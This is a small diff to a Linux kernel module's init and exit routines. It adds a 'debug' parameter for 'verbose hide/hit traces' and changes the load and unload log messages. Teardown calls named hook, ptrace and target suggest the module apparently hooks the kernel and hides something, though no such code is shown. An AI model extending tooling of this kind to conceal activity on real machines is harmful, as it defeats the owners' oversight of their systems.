@@ -1,6 +1,11 @@
 #include "drv.h"
 
 #include <linux/module.h>
+#include <linux/moduleparam.h>
+
+int wr_debug;
+module_param_named(debug, wr_debug, int, 0644);
+MODULE_PARM_DESC(debug, "verbose hide/hit traces");
 
 static int
 wr_init(void)
@@ -25,7 +30,7 @@ wr_init(void)
 	err = dev_init();
 	if (err)
 		goto e_brk;
-	pr_info("wr41th: loaded\n");
+	wr_info("loaded debug=%d\n", wr_debug);
 	return 0;
 
 e_brk:
@@ -50,7 +55,7 @@ wr_exit(void)
 	ptrace_fini();
 	hook_fini();
 	tgt_fini();
-	pr_info("wr41th: gone\n");
+	wr_info("gone\n");
 }
 
 int
